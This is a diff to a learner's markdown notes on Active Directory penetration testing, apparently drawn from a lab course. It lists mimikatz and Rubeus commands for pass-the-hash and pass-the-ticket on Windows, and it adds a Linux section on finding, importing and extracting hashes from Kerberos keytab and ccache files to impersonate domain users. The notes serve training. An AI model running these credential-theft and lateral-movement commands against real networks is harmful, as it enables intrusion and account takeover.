@@ -235,7 +235,7 @@ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 1
 Crackmapexec -- nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"  
 
 ## Windows Lateral Movement Techniques  
-**Pass the Hash(PtH)** :  
+## Pass the Hash(PtH) :  
 From Windows: using mimikatz, powershell  
 mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit  //starts cmd of target  
 
@@ -257,7 +257,7 @@ UAC (User Account Control) limits local users' ability to perform remote adminis
 it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks.  
 Setting it to 1 allows the other local admins as well.  
 
-**Pass the Ticket(PtT) from Windows**: passing stolen kerberos tickets tgts and tgs  
+## Pass the Ticket(PtT) from Windows: passing stolen kerberos tickets tgts and tgs  
 OverPass-the-Hash Aka pass the key --- instead of passing tgt which expire in 10 hours,  
 We extract the kerberos encryption keys which is basically users password hashes aes/Rc4 stored in lsass for sso  
 this user hash is dumped and used to request the TGT for the user(This is the key used in AS-REQ timestamp encryption to prove users identity)  
@@ -274,7 +274,7 @@ if the service name targets the krbtgt account this is tgt
 if the service name targets mssqlsv then its a tgs  
 Rubeus.exe describe /ticket:C:\path\to\ticket.kirbi  //check type look for service name  
 
-....With Mimikatz....  mimikatz.exe  privilege::debug  
+....**With Mimikatz**....  mimikatz.exe  privilege::debug  
 sekurlsa::tickets /export   //harvest tickets //saves tickets as .kirb  
 
 sekurlsa::ekeys  //extract aes/rc4 kerberos keys for overpass-the-hash   
@@ -286,7 +286,7 @@ kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaint
 //same after mimikatz exit try -- launch powershell and Enter-PSSession -ComputerName DC01  //connects as a kerberos tgt user to the target computer over winrm  
 
 
-.....With Rubeus.....  
+.....**With Rubeus**.....  
 Rubeus.exe dump /nowrap  //harvest tickets, better mimikatz sometime error  //returns base64 encoded ticket  
 Rubeus.exe dump /service:krbtgt /nowrap /filename:C:\Users\Public\      //automatically parses and wites .kirb to the given path  
 
@@ -312,6 +312,53 @@ Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show  //this op
 //here on new windows pass the hash /ptt using rubeus and then launch powershell and use psremoting as depicted in mimikatz section  
 Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi  
 
+## Pass the Ticket(PtT) from Linux:  
+In most cases, Linux machines store Kerberos tickets as **ccache** files in the /tmp directory.  -- need perm to read  
+By default, the location of the Kerberos ticket is stored in the environment variable **KRB5CCNAME**.  
+Another everyday use of Kerberos in Linux is with **keytab** files.  has user principal and kerberos master keys of user  
+can use a keytab file to authenticate to various remote systems using Kerberos without entering a password  
+commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction  
+
+**Identity Linux and AD integration**  
+realm list  //prints the domain joined info  
+ps -ef | grep -i "winbind\|sssd"   //if realm not present, use this to check if linux machine is domain joined look for domain name  
+
+**Finding kerberos tickets in Linux**  
+---Finding keytabs---
+find / -name *keytab* -ls 2>/dev/null   //list keytab files ex: carlos.keytab  
+//to use a keytab file we must have a read and write perms on the file  //this is maybe not just read should do double check  
+/etc/krb5.keytab - computer account keytab file location - read root priv, can impersonate computer account  
+
+---Finding ccache files---
+env | grep -i krb5  //check env variables KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh  
+ls -la /tmp   //ccahe in default tmp  
+
+**Abusing keytab files**  
+klist -k -t /opt/specialfiles/carlos.keytab   //to know which user the keytab was created for  
+klist  //check current user not carlos   
+kinit carlos@soda.HTB -k -t /opt/specialfiles/carlos.keytab  //import carlos keytab  
+klist  //check default principal now changed to carlos  
+smbclient //dc01/carlos -k -c ls  //access smb using imported kerberos ticket  
+
+**Keytab extract**  -- same as extracting kerberos master keys for overpass-the-hash  
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab  //extracts ntlm/rc4/aes hashes that can be used for overpass-the-hash  
+if ntlm/rc4/aes hash cracked then switch to that user  su - carlos@soda.htb  
+//can use the same command to extract hashes from .kt files as well .kt is also keytab file abbreviation  
+
+**Abusing ccache**  
+To abuse a ccache file, all we need is read privileges on the file.  
+These files, located in /tmp, can only be read by the user who created them, but if we gain root access, we could use them.  
+ls -la /tmp  //find new user julio  // id julio@inlanefreight.htb  //reveals part of domain admins  
+klist -- check current kerberos  
+cp /tmp/krb5cc_647401106_I8I133 .  //copy the ccache file from /tmp to current  
+export KRB5CCNAME=/test/krb5cc_647401106_I8I133  
+klist ---  imported kerb user julie  
+smbclient //dc01/C$ -k -c ls -no-pass  //read domain admin C$ with k kerberos auth  
+
+## Using Linux attack tools with kerberos  
+
+
+
 **Password policies**:  
 passwords to expire, account lockout, password strength, password history  
 NIST, CIS and PCI DSS password policy guides  
@@ -321,6 +368,8 @@ use password generators, use multiple words easy still strong because of length
 Lastpass, 1Password, Keepass, password safe  
 Alternatives: Go Passwordless, MFA, Justintimeaccess, IP restrictions, deivce compliance enforcement  
 
+Check schedued tasks and other scripts for the use of kerberos tickets  
+kinit tool to import keytab into user session, look for kerberos tickets .kt in scripts/tasks also for keyword kinit  
 
 
 
